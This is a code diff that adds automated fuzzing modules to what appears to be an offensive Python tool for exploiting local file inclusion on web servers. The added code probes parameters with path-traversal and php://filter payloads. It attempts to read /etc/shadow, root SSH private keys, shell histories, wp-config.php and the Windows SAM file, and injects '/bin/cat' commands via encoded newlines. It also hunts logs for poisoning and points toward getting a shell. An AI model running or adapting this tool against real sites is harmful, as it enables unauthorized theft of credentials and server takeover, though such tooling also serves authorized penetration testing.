@@ -26,6 +26,7 @@ import sys
 import time
 import socket
 import os
+import signal
 from typing import List, Dict, Tuple, Optional
 from colorama import Fore, Style, init
 import warnings
@@ -1531,6 +1532,617 @@ $phar->stopBuffering();
         
         return False
     
+    # ==================== ADVANCED FUZZING MODULE ====================
+    
+    def fuzz_parameters(self, wordlist: str = None, threads: int = 10) -> List[str]:
+        """Advanced parameter fuzzing - better than ffuf for LFI"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FUZZING] Advanced Parameter Discovery")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        # Comprehensive LFI parameter names from all sources
+        if not wordlist:
+            params = [
+                # Common parameters
+                'file', 'page', 'lang', 'language', 'doc', 'document', 'path', 'folder',
+                'root', 'pg', 'style', 'template', 'view', 'content', 'layout', 'inc',
+                'include', 'read', 'show', 'dir', 'action', 'board', 'date', 'detail',
+                'download', 'prefix', 'load', 'module', 'open', 'pdf', 'cat', 'filepath',
+                'filename', 'data', 'readfile', 'url', 'pag', 'pg', 'pagina', 'name',
+                'archivo', 'fichier', 'ficheiro', 'file_name', 'file_path', 'file_url',
+                # Hidden parameters from PayloadsAllTheThings
+                'src', 'source', 'sourcePath', 'sourceFile', 'sourceURL', 'filePath',
+                'fileURL', 'pathToFile', 'urlPath', 'urlToFile', 'get', 'readFile',
+                'readPath', 'sourcefile', 'pg', 'article', 'section', 'chapter',
+                'ref', 'reference', 'book', 'file_name', 'file_url', 'filepath',
+                'fileurl', 'readfile', 'readpath', 'srcfile', 'sourcepath',
+                # More variations
+                'destino', 'destination', 'go', 'goto', 'out', 'output', 'redir',
+                'redirect', 'return', 'returnTo', 'site', 'to', 'uri', 'URL', 'val',
+                'validate', 'window', 'WINDOW', 'next', 'img', 'image', 'picture',
+                'xurl', 'Redirect', 'RedirectTo', 'returnurl', 'return_url', 'r',
+                'u', 'nav', 'navigation', 'link', 'html', 'src_file', 'conf',
+                'config', 'configuration', 'theme', 'skin', 'listing', 'list',
+            ]
+        else:
+            try:
+                print(f"{Fore.YELLOW}[*] Loading wordlist: {wordlist}{Style.RESET_ALL}")
+                with open(wordlist, 'r') as f:
+                    params = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+                print(f"{Fore.GREEN}[✓] Loaded {len(params)} parameters from wordlist{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[✗] Could not read wordlist: {str(e)}{Style.RESET_ALL}")
+                return []
+        
+        # Parse URL properly
+        from urllib.parse import urlparse, urlunparse
+        parsed = urlparse(self.target_url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        
+        print(f"{Fore.YELLOW}[*] Testing {len(params)} parameters...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Target: {base_url}{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Using {threads} concurrent threads{Style.RESET_ALL}")
+        
+        # Multiple test payloads for better detection
+        test_payloads = [
+            '/etc/passwd',
+            '../../../../../../etc/passwd',
+            '....//....//....//etc/passwd',
+            '/etc/hosts',
+            '../../../../../../etc/hosts',
+            'php://filter/convert.base64-encode/resource=index.php',
+        ]
+        
+        vulnerable_params = []
+        
+        # Get baseline
+        try:
+            baseline = self.session.get(base_url, proxies=self.proxy, timeout=5)
+            baseline_size = len(baseline.text)
+            baseline_words = len(baseline.text.split())
+            print(f"{Fore.CYAN}[*] Baseline: {baseline_size} bytes, {baseline_words} words{Style.RESET_ALL}")
+        except:
+            baseline_size = 0
+            baseline_words = 0
+        
+        tested = 0
+        start_time = time.time()
+        
+        try:
+            for param in params:
+                tested += 1
+                if tested % 50 == 0:
+                    elapsed = time.time() - start_time
+                    rate = tested / elapsed if elapsed > 0 else 0
+                    remaining = (len(params) - tested) / rate if rate > 0 else 0
+                    print(f"{Fore.CYAN}[*] Progress: {tested}/{len(params)} | Rate: {rate:.1f}/s | ETA: {int(remaining)}s{Style.RESET_ALL}")
+                
+                for payload in test_payloads:
+                    try:
+                        test_url = f"{base_url}?{param}={payload}"
+                        response = self.session.get(test_url, proxies=self.proxy, timeout=3)
+                        
+                        # Multiple detection methods
+                        # 1. Check for /etc/passwd content
+                        if 'root:' in response.text and '/bin' in response.text:
+                            print(f"{Fore.GREEN}[✓✓✓] CONFIRMED: {param} - /etc/passwd readable!{Style.RESET_ALL}")
+                            if param not in vulnerable_params:
+                                vulnerable_params.append(param)
+                            break
+                        
+                        # 2. Check for /etc/hosts content
+                        if 'localhost' in response.text and '127.0.0.1' in response.text:
+                            size_diff = abs(len(response.text) - baseline_size)
+                            if size_diff > 20:
+                                print(f"{Fore.GREEN}[✓✓] LIKELY: {param} - /etc/hosts readable!{Style.RESET_ALL}")
+                                if param not in vulnerable_params:
+                                    vulnerable_params.append(param)
+                                break
+                        
+                        # 3. Check for PHP filter base64 output
+                        if payload.startswith('php://filter') and 'PD9waHAgCg==' in response.text:
+                            print(f"{Fore.GREEN}[✓✓✓] CONFIRMED: {param} - PHP filter working!{Style.RESET_ALL}")
+                            if param not in vulnerable_params:
+                                vulnerable_params.append(param)
+                            break
+                        
+                        # 4. Check size/word difference
+                        size_diff = abs(len(response.text) - baseline_size)
+                        word_diff = abs(len(response.text.split()) - baseline_words)
+                        
+                        if size_diff > 200 or word_diff > 50:
+                            # Verify with another payload
+                            verify_url = f"{base_url}?{param}=/etc/issue"
+                            verify_response = self.session.get(verify_url, proxies=self.proxy, timeout=3)
+                            verify_diff = abs(len(verify_response.text) - baseline_size)
+                            
+                            if verify_diff > 50:
+                                print(f"{Fore.YELLOW}[✓] POSSIBLE: {param} - Size diff: {size_diff}{Style.RESET_ALL}")
+                                if param not in vulnerable_params:
+                                    vulnerable_params.append(param)
+                                break
+                        
+                    except:
+                        continue
+        
+        except KeyboardInterrupt:
+            print(f"\n\n{Fore.YELLOW}[!] Parameter fuzzing interrupted by user (CTRL+C){Style.RESET_ALL}")
+            print(f"{Fore.CYAN}[*] Tested {tested}/{len(params)} parameters before interruption{Style.RESET_ALL}")
+        
+        elapsed = time.time() - start_time
+        print(f"\n{Fore.CYAN}[*] Fuzzing completed in {elapsed:.1f} seconds{Style.RESET_ALL}")
+        
+        if vulnerable_params:
+            print(f"\n{Fore.GREEN}[+] Found {len(vulnerable_params)} vulnerable parameter(s):{Style.RESET_ALL}")
+            for param in vulnerable_params:
+                print(f"  - {param}")
+        else:
+            print(f"\n{Fore.RED}[✗] No vulnerable parameters found{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[TIP] Try:{Style.RESET_ALL}")
+            print(f"  1. Use larger wordlist: --wordlist /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt")
+            print(f"  2. Fuzz files instead: --fuzz-files")
+            print(f"  3. Try different page: -u http://target.com/admin.php")
+        
+        return vulnerable_params
+    
+    def fuzz_files(self, wordlist: str = None, threads: int = 10) -> List[str]:
+        """Advanced file fuzzing with comprehensive payloads"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FUZZING] Advanced File Discovery")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        # Mega payload list from all sources
+        if not wordlist:
+            files = [
+                # Linux system files
+                '/etc/passwd', '/etc/shadow', '/etc/hosts', '/etc/hostname', '/etc/issue',
+                '/etc/group', '/etc/motd', '/etc/mysql/my.cnf', '/etc/fstab',
+                # Apache configs
+                '/etc/apache2/apache2.conf', '/etc/apache2/sites-enabled/000-default.conf',
+                '/usr/local/apache/conf/httpd.conf', '/etc/httpd/conf/httpd.conf',
+                '/var/www/conf/httpd.conf', '/etc/apache2/envvars',
+                # Nginx configs
+                '/etc/nginx/nginx.conf', '/etc/nginx/sites-enabled/default',
+                '/usr/local/nginx/conf/nginx.conf', '/etc/nginx/conf.d/default.conf',
+                # PHP configs
+                '/etc/php/7.4/apache2/php.ini', '/etc/php/8.0/apache2/php.ini',
+                '/etc/php.ini', '/usr/local/etc/php.ini', '/etc/php/php.ini',
+                # Application files
+                '/var/www/html/index.php', '/var/www/html/config.php',
+                '/var/www/html/wp-config.php', '/var/www/html/.htaccess',
+                # Proc filesystem
+                '/proc/self/environ', '/proc/self/cmdline', '/proc/self/stat',
+                '/proc/self/status', '/proc/self/fd/0', '/proc/self/fd/1',
+                '/proc/self/fd/2', '/proc/self/fd/3', '/proc/self/fd/4',
+                '/proc/version', '/proc/cpuinfo',
+                # Logs
+                '/var/log/apache2/access.log', '/var/log/apache2/error.log',
+                '/var/log/nginx/access.log', '/var/log/nginx/error.log',
+                '/var/log/httpd/access_log', '/var/log/httpd/error_log',
+                '/var/log/auth.log', '/var/log/syslog', '/var/log/messages',
+                # SSH keys
+                '/root/.ssh/id_rsa', '/root/.ssh/id_dsa', '/root/.ssh/authorized_keys',
+                '/home/user/.ssh/id_rsa', '/.ssh/id_rsa', '/.ssh/authorized_keys',
+                # History files
+                '/root/.bash_history', '/.bash_history', '/root/.mysql_history',
+                '/.mysql_history', '/root/.php_history',
+                # Database configs
+                '/etc/mysql/my.cnf', '/etc/my.cnf', '/var/www/html/config.inc.php',
+                # Windows (if needed)
+                'C:/Windows/System32/drivers/etc/hosts', 'C:/Windows/win.ini',
+                'C:/boot.ini', 'C:/Windows/System32/config/SAM',
+            ]
+        else:
+            try:
+                print(f"{Fore.YELLOW}[*] Loading wordlist: {wordlist}{Style.RESET_ALL}")
+                with open(wordlist, 'r') as f:
+                    files = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+                print(f"{Fore.GREEN}[✓] Loaded {len(files)} files from wordlist{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[✗] Could not read wordlist: {str(e)}{Style.RESET_ALL}")
+                return []
+        
+        print(f"{Fore.YELLOW}[*] Testing {len(files)} files...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Using {threads} concurrent threads{Style.RESET_ALL}")
+        
+        found_files = []
+        tested = 0
+        start_time = time.time()
+        
+        try:
+            for file_path in files:
+                tested += 1
+                if tested % 50 == 0:
+                    elapsed = time.time() - start_time
+                    rate = tested / elapsed if elapsed > 0 else 0
+                    remaining = (len(files) - tested) / rate if rate > 0 else 0
+                    print(f"{Fore.CYAN}[*] Progress: {tested}/{len(files)} | Found: {len(found_files)} | Rate: {rate:.1f}/s | ETA: {int(remaining)}s{Style.RESET_ALL}")
+                
+                # Try multiple bypass techniques
+                payloads = [
+                    file_path,
+                    f"../{file_path}",
+                    f"../../{file_path}",
+                    f"../../../{file_path}",
+                    f"../../../../{file_path}",
+                    f"../../../../../{file_path}",
+                    # URL-encoded payloads (like gobuster found)
+                    f"%0a/bin/cat%20{file_path}",  # Newline + cat command
+                    f"%0d/bin/cat%20{file_path}",  # Carriage return + cat
+                    # Double URL encoding
+                    f"%250a%2Fbin%2Fcat%2520{file_path}",
+                ]
+                
+                for payload in payloads:
+                    try:
+                        response = self._send_payload(payload)
+                        
+                        # Detection methods
+                        is_valid = False
+                        
+                        # 1. Check for specific file content
+                        if file_path.endswith('passwd') and 'root:' in response.text:
+                            is_valid = True
+                        elif file_path.endswith('hosts') and '127.0.0.1' in response.text:
+                            is_valid = True
+                        elif 'php.ini' in file_path and 'display_errors' in response.text:
+                            is_valid = True
+                        elif '.conf' in file_path and ('ServerRoot' in response.text or 'server_name' in response.text):
+                            is_valid = True
+                        elif len(response.text) > 100:
+                            # Check it's not HTML error page
+                            if not ('<html' in response.text.lower() and '</html>' in response.text.lower()):
+                                is_valid = True
+                            elif '<?php' in response.text or 'root:' in response.text:
+                                is_valid = True
+                        
+                        if is_valid:
+                            print(f"{Fore.GREEN}[✓] Readable: {file_path} (via {payload}){Style.RESET_ALL}")
+                            if file_path not in found_files:
+                                found_files.append(file_path)
+                            break
+                            
+                    except:
+                        continue
+        
+        except KeyboardInterrupt:
+            print(f"\n\n{Fore.YELLOW}[!] File fuzzing interrupted by user (CTRL+C){Style.RESET_ALL}")
+            print(f"{Fore.CYAN}[*] Tested {tested}/{len(files)} files before interruption{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[*] Found {len(found_files)} files so far{Style.RESET_ALL}")
+        
+        elapsed = time.time() - start_time
+        print(f"\n{Fore.CYAN}[*] Fuzzing completed in {elapsed:.1f} seconds{Style.RESET_ALL}")
+        
+        if found_files:
+            print(f"\n{Fore.GREEN}[+] Found {len(found_files)} readable file(s){Style.RESET_ALL}")
+            
+            # Categorize findings
+            configs = [f for f in found_files if 'conf' in f or '.ini' in f]
+            logs = [f for f in found_files if 'log' in f]
+            sensitive = [f for f in found_files if any(x in f for x in ['passwd', 'shadow', 'ssh', 'mysql', 'config'])]
+            
+            if configs:
+                print(f"\n{Fore.YELLOW}[CONFIGS] {len(configs)} config files:{Style.RESET_ALL}")
+                for f in configs[:5]:
+                    print(f"  - {f}")
+            
+            if logs:
+                print(f"\n{Fore.YELLOW}[LOGS] {len(logs)} log files (poisoning possible):{Style.RESET_ALL}")
+                for f in logs[:5]:
+                    print(f"  - {f}")
+            
+            if sensitive:
+                print(f"\n{Fore.RED}[SENSITIVE] {len(sensitive)} sensitive files:{Style.RESET_ALL}")
+                for f in sensitive[:5]:
+                    print(f"  - {f}")
+                    
+        else:
+            print(f"\n{Fore.RED}[✗] No readable files found{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[TIP] Try:{Style.RESET_ALL}")
+            print(f"  1. Use LFI-specific wordlist: --wordlist /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt")
+            print(f"  2. Check if parameter is correct: --fuzz-params")
+            print(f"  3. Try wrapper techniques: --auto")
+        
+        return found_files
+        """Fuzz for LFI-vulnerable parameters"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FUZZING] Parameter Discovery")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        # Common LFI parameter names
+        if not wordlist:
+            params = [
+                'file', 'page', 'lang', 'language', 'doc', 'document',
+                'path', 'folder', 'root', 'pg', 'style', 'template',
+                'view', 'content', 'layout', 'inc', 'include', 'read',
+                'show', 'dir', 'action', 'board', 'date', 'detail',
+                'download', 'prefix', 'load', 'module', 'open', 'pdf',
+                'cat', 'filepath', 'filename', 'data', 'readfile'
+            ]
+        else:
+            try:
+                print(f"{Fore.YELLOW}[*] Loading wordlist: {wordlist}{Style.RESET_ALL}")
+                with open(wordlist, 'r') as f:
+                    params = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+                print(f"{Fore.GREEN}[✓] Loaded {len(params)} parameters from wordlist{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[✗] Could not read wordlist: {str(e)}{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[*] Using built-in wordlist instead{Style.RESET_ALL}")
+                params = [
+                    'file', 'page', 'lang', 'language', 'doc', 'document',
+                    'path', 'folder', 'root', 'pg', 'style', 'template',
+                    'view', 'content', 'layout', 'inc', 'include', 'read',
+                    'show', 'dir', 'action', 'board', 'date', 'detail',
+                    'download', 'prefix', 'load', 'module', 'open', 'pdf',
+                    'cat', 'filepath', 'filename', 'data', 'readfile'
+                ]
+        
+        print(f"{Fore.YELLOW}[*] Testing {len(params)} parameters...{Style.RESET_ALL}")
+        
+        # Use base URL without existing parameters
+        from urllib.parse import urlparse, urlunparse
+        parsed = urlparse(self.target_url)
+        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+        
+        print(f"{Fore.YELLOW}[*] Target: {base_url}{Style.RESET_ALL}")
+        
+        # Test payloads
+        test_payloads = [
+            '/etc/passwd',
+            '../../../../../../etc/passwd',
+            '....//....//....//etc/passwd',
+        ]
+        
+        vulnerable_params = []
+        
+        # Get baseline response size
+        try:
+            baseline = self.session.get(base_url, proxies=self.proxy, timeout=5)
+            baseline_size = len(baseline.text)
+            print(f"{Fore.CYAN}[*] Baseline response size: {baseline_size} bytes{Style.RESET_ALL}")
+        except:
+            baseline_size = 0
+        
+        tested = 0
+        for param in params:
+            tested += 1
+            if tested % 10 == 0:
+                print(f"{Fore.CYAN}[*] Progress: {tested}/{len(params)} parameters tested...{Style.RESET_ALL}")
+            
+            try:
+                # Try with /etc/passwd
+                test_url = f"{base_url}?{param}=/etc/passwd"
+                response = self.session.get(test_url, proxies=self.proxy, timeout=5)
+                
+                # Check for indicators of LFI
+                if 'root:' in response.text and '/bin' in response.text:
+                    print(f"{Fore.GREEN}[✓] Found vulnerable parameter: {param}{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}    Payload: /etc/passwd{Style.RESET_ALL}")
+                    vulnerable_params.append(param)
+                    continue
+                    
+                # Check size difference
+                if abs(len(response.text) - baseline_size) > 100:
+                    # Try another payload to confirm
+                    test_url = f"{base_url}?{param}=/etc/hosts"
+                    response2 = self.session.get(test_url, proxies=self.proxy, timeout=5)
+                    
+                    if 'localhost' in response2.text or '127.0.0.1' in response2.text:
+                        print(f"{Fore.GREEN}[✓] Found vulnerable parameter: {param}{Style.RESET_ALL}")
+                        print(f"{Fore.GREEN}    Payload: /etc/hosts{Style.RESET_ALL}")
+                        vulnerable_params.append(param)
+                        
+            except:
+                continue
+        
+        if vulnerable_params:
+            print(f"\n{Fore.GREEN}[+] Found {len(vulnerable_params)} vulnerable parameter(s):{Style.RESET_ALL}")
+            for param in vulnerable_params:
+                print(f"  - {param}")
+        else:
+            print(f"\n{Fore.RED}[✗] No vulnerable parameters found{Style.RESET_ALL}")
+            print(f"\n{Fore.YELLOW}[TIP] Try using a larger wordlist:{Style.RESET_ALL}")
+            print(f"  --wordlist /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt")
+        
+        return vulnerable_params
+    
+    def fuzz_logs(self) -> List[str]:
+        """Fuzz for accessible log files"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FUZZING] Log File Discovery")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        log_paths = [
+            '/var/log/apache2/access.log',
+            '/var/log/apache2/error.log',
+            '/var/log/nginx/access.log',
+            '/var/log/nginx/error.log',
+            '/var/log/apache/access.log',
+            '/var/log/apache/error.log',
+            '/var/log/httpd/access_log',
+            '/var/log/httpd/error_log',
+            '/var/log/sshd.log',
+            '/var/log/auth.log',
+            '/var/log/mail.log',
+            '/var/log/vsftpd.log',
+        ]
+        
+        print(f"{Fore.YELLOW}[*] Testing {len(log_paths)} log paths...{Style.RESET_ALL}")
+        
+        found_logs = []
+        
+        for log_path in log_paths:
+            try:
+                response = self._send_payload(log_path)
+                
+                # Check for log indicators
+                log_indicators = ['GET /', 'POST /', 'HTTP/1.', '200 ', '404 ', 'Mozilla']
+                
+                if any(indicator in response.text for indicator in log_indicators):
+                    if not ('<html' in response.text.lower() and '</html>' in response.text.lower()):
+                        print(f"{Fore.GREEN}[✓] Readable log: {log_path}{Style.RESET_ALL}")
+                        found_logs.append(log_path)
+                        
+            except:
+                continue
+        
+        if found_logs:
+            print(f"\n{Fore.GREEN}[+] Found {len(found_logs)} readable log file(s){Style.RESET_ALL}")
+        else:
+            print(f"\n{Fore.RED}[✗] No readable log files found{Style.RESET_ALL}")
+        
+        return found_logs
+    
+    def fuzz_webroot(self, wordlist: str = None) -> str:
+        """Fuzz for webroot path"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FUZZING] Webroot Discovery")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        if not wordlist:
+            webroot_paths = [
+                '/var/www/html',
+                '/var/www',
+                '/usr/share/nginx/html',
+                '/usr/local/apache2/htdocs',
+                '/var/apache2/htdocs',
+                '/usr/local/var/www',
+                '/var/www/localhost/htdocs',
+                '/var/www/htdocs',
+                '/var/html',
+                '/srv/www/htdocs',
+                '/home/www/public_html',
+                '/var/www/public_html',
+            ]
+        else:
+            try:
+                print(f"{Fore.YELLOW}[*] Loading wordlist: {wordlist}{Style.RESET_ALL}")
+                with open(wordlist, 'r') as f:
+                    webroot_paths = [line.strip() for line in f if line.strip() and not line.startswith('#')]
+                print(f"{Fore.GREEN}[✓] Loaded {len(webroot_paths)} webroot paths from wordlist{Style.RESET_ALL}")
+            except Exception as e:
+                print(f"{Fore.RED}[✗] Could not read wordlist: {str(e)}{Style.RESET_ALL}")
+                return None
+        
+        print(f"{Fore.YELLOW}[*] Testing {len(webroot_paths)} webroot paths...{Style.RESET_ALL}")
+        
+        tested = 0
+        for webroot in webroot_paths:
+            tested += 1
+            if tested % 10 == 0:
+                print(f"{Fore.CYAN}[*] Progress: {tested}/{len(webroot_paths)} paths tested...{Style.RESET_ALL}")
+            
+            try:
+                # Try to include index.php from webroot
+                test_payload = f"../../../../{webroot}/index.php"
+                response = self._send_payload(test_payload)
+                
+                # If we get a very small response (recursive inclusion) or PHP code, webroot found
+                if len(response.text) < 100 or '<?php' in response.text:
+                    print(f"{Fore.GREEN}[✓] Webroot found: {webroot}{Style.RESET_ALL}")
+                    return webroot
+                    
+            except:
+                continue
+        
+        print(f"{Fore.RED}[✗] Webroot not found{Style.RESET_ALL}")
+        print(f"\n{Fore.YELLOW}[TIP] Try using webroot wordlist:{Style.RESET_ALL}")
+        print(f"  Linux: --wordlist /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt")
+        print(f"  Windows: --wordlist /opt/useful/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt")
+        return None
+    
+    def fuzz_all(self, wordlist: str = None) -> Dict:
+        """Run all fuzzing modules - complete recon"""
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[FUZZING] Complete Automated Reconnaissance")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        results = {
+            'parameters': [],
+            'files': [],
+            'logs': [],
+            'webroot': None
+        }
+        
+        # Step 1: Fuzz parameters (if none specified or generic)
+        if not self.parameter or self.parameter in ['AUTO', 'test', 'dummy', 'index']:
+            print(f"{Fore.YELLOW}[*] No valid parameter specified, fuzzing for vulnerable parameters...{Style.RESET_ALL}")
+            results['parameters'] = self.fuzz_parameters(wordlist)
+            
+            if results['parameters']:
+                # Use first found parameter
+                self.parameter = results['parameters'][0]
+                print(f"\n{Fore.GREEN}[✓] Using parameter: {self.parameter}{Style.RESET_ALL}")
+            else:
+                print(f"\n{Fore.RED}[✗] No vulnerable parameters found!{Style.RESET_ALL}")
+                print(f"{Fore.YELLOW}[!] Cannot continue without a vulnerable parameter{Style.RESET_ALL}")
+                return results
+        
+        # Step 2: Fuzz for interesting files
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[STEP 2] File Discovery with parameter: {self.parameter}")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        results['files'] = self.fuzz_files(wordlist)
+        
+        # Step 3: Fuzz for logs
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[STEP 3] Log File Discovery")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        results['logs'] = self.fuzz_logs()
+        
+        # Step 4: Fuzz for webroot
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[STEP 4] Webroot Discovery")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        results['webroot'] = self.fuzz_webroot(wordlist)
+        
+        # Print comprehensive summary
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[SUMMARY] Complete Reconnaissance Results")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        if results['parameters']:
+            print(f"\n{Fore.GREEN}[+] Vulnerable Parameters: {len(results['parameters'])}{Style.RESET_ALL}")
+            for p in results['parameters']:
+                print(f"  - {p}")
+        
+        if results['files']:
+            print(f"\n{Fore.GREEN}[+] Readable Files: {len(results['files'])}{Style.RESET_ALL}")
+            # Show top 10
+            for f in results['files'][:10]:
+                print(f"  - {f}")
+            if len(results['files']) > 10:
+                print(f"  ... and {len(results['files']) - 10} more")
+        
+        if results['logs']:
+            print(f"\n{Fore.GREEN}[+] Readable Logs: {len(results['logs'])} (Log poisoning possible!){Style.RESET_ALL}")
+            for l in results['logs']:
+                print(f"  - {l}")
+        
+        if results['webroot']:
+            print(f"\n{Fore.GREEN}[+] Webroot: {results['webroot']}{Style.RESET_ALL}")
+        
+        # Suggestions
+        print(f"\n{Fore.CYAN}{'='*60}")
+        print(f"[NEXT STEPS] Exploitation Suggestions")
+        print(f"{'='*60}{Style.RESET_ALL}")
+        
+        if results['logs']:
+            print(f"\n{Fore.YELLOW}[→] Try log poisoning:{Style.RESET_ALL}")
+            print(f"    python3 ghostlfi.py -u {self.target_url} -p {self.parameter} --test-log-poison")
+        
+        if results['files']:
+            print(f"\n{Fore.YELLOW}[→] Try automatic exploitation:{Style.RESET_ALL}")
+            print(f"    python3 ghostlfi.py -u {self.target_url} -p {self.parameter} --auto --shell")
+        
+        if results['webroot']:
+            print(f"\n{Fore.YELLOW}[→] Try file upload + LFI:{Style.RESET_ALL}")
+            print(f"    python3 ghostlfi.py -u {self.target_url} -p {self.parameter} --test-file-upload")
+        
+        return results
+    
+    # ==================== LOG POISONING ====================
+    
     def test_log_poisoning(self) -> bool:
         """Automatically test file upload + LFI if files exist"""
         print(f"\n{Fore.CYAN}[AUTO-TEST] Testing uploaded files...{Style.RESET_ALL}")
@@ -2125,46 +2737,43 @@ $phar->stopBuffering();
 
 
 def main():
+    # Handle CTRL+C gracefully
+    def signal_handler(sig, frame):
+        print(f"\n\n{Fore.YELLOW}[!] CTRL+C detected - Stopping...{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}[*] Cleaning up...{Style.RESET_ALL}")
+        sys.exit(0)
+    
+    signal.signal(signal.SIGINT, signal_handler)
+    
     parser = argparse.ArgumentParser(
         description='GhostLFI - Local File Inclusion Exploitation Framework by Ghost Ops Security',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog='''
 Examples:
-  # Auto-exploit (recommended)
-  python3 ghostlfi.py -u http://target.com/page.php -p file --auto
+  # Discover vulnerable parameters (NO -p needed!)
+  python3 ghostlfi.py -u http://target.com/index.php --fuzz-params
   
-  # Auto-exploit with advanced techniques
-  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --advanced
+  # Full auto-discovery and exploitation
+  python3 ghostlfi.py -u http://target.com/index.php --fuzz-all
   
-  # Interactive shell
+  # Auto-exploit with known parameter
   python3 ghostlfi.py -u http://target.com/page.php -p file --auto --shell
   
-  # Reverse shell
-  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --revshell --lhost 10.10.10.1
+  # Parameter discovery with custom wordlist
+  python3 ghostlfi.py -u http://target.com/index.php --fuzz-params --wordlist /path/to/params.txt
   
-  # Generate payloads
-  python3 ghostlfi.py -u http://target.com/page.php -p file --generate lfi
-  python3 ghostlfi.py -u http://target.com/page.php -p file --generate wrappers
-  python3 ghostlfi.py -u http://target.com/page.php -p file --generate shells
-  python3 ghostlfi.py -u http://target.com/page.php -p file --generate revshell
+  # Auto-exploit (discovers parameter automatically)
+  python3 ghostlfi.py -u http://target.com/page.php --auto
   
-  # Test specific techniques
-  python3 ghostlfi.py -u http://target.com/page.php -p file --test-bypass
-  python3 ghostlfi.py -u http://target.com/page.php -p file --test-log-poison
-  python3 ghostlfi.py -u http://target.com/page.php -p file --test-session-poison
-  python3 ghostlfi.py -u http://target.com/page.php -p file --test-rfi
-  
-  # RFI Server Setup
-  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup http --rfi-lhost 10.10.10.1
-  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup ftp --rfi-lhost 10.10.10.1
-  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup smb --rfi-lhost 10.10.10.1
+  # Interactive shell after auto-discovery
+  python3 ghostlfi.py -u http://target.com/page.php --auto --shell
 
 Ghost Ops Security | For Authorized Testing Only
         '''
     )
     
     parser.add_argument('-u', '--url', required=True, help='Target URL')
-    parser.add_argument('-p', '--parameter', required=True, help='Vulnerable parameter')
+    parser.add_argument('-p', '--parameter', default='AUTO', help='Vulnerable parameter (use AUTO to discover, or leave blank to auto-discover)')
     parser.add_argument('--proxy', help='Proxy (http://127.0.0.1:8080)')
     
     # Modes
@@ -2185,6 +2794,14 @@ Ghost Ops Security | For Authorized Testing Only
     parser.add_argument('--lfi-param', help='LFI parameter if different from main parameter (e.g., language)')
     parser.add_argument('--test-rfi', action='store_true', help='Test Remote File Inclusion (RFI)')
     
+    # Fuzzing
+    parser.add_argument('--fuzz-params', action='store_true', help='Fuzz for vulnerable parameters')
+    parser.add_argument('--fuzz-files', action='store_true', help='Fuzz for readable files')
+    parser.add_argument('--fuzz-logs', action='store_true', help='Fuzz for accessible log files')
+    parser.add_argument('--fuzz-webroot', action='store_true', help='Fuzz for webroot path')
+    parser.add_argument('--fuzz-all', action='store_true', help='Run all fuzzing modules')
+    parser.add_argument('--wordlist', help='Custom wordlist for fuzzing')
+    
     # RFI Setup
     parser.add_argument('--rfi-setup', choices=['http', 'ftp', 'smb'], help='Setup RFI server (http/ftp/smb)')
     parser.add_argument('--rfi-lhost', help='Your IP for RFI server')
@@ -2203,6 +2820,25 @@ Ghost Ops Security | For Authorized Testing Only
     
     exploiter = UltimateLFIExploiter(target_url, args.parameter, args.proxy)
     exploiter.print_banner()
+    
+    # Auto-discover parameter if set to AUTO and not in specific modes
+    if args.parameter == 'AUTO' and not any([args.generate, args.fuzz_params]):
+        print(f"\n{Fore.YELLOW}[*] No parameter specified, starting auto-discovery...{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] Fuzzing for vulnerable parameters...{Style.RESET_ALL}\n")
+        
+        found_params = exploiter.fuzz_parameters(args.wordlist)
+        
+        if found_params:
+            exploiter.parameter = found_params[0]
+            print(f"\n{Fore.GREEN}[✓] Auto-discovered parameter: {exploiter.parameter}{Style.RESET_ALL}")
+            print(f"{Fore.GREEN}[✓] Continuing with exploitation...{Style.RESET_ALL}\n")
+        else:
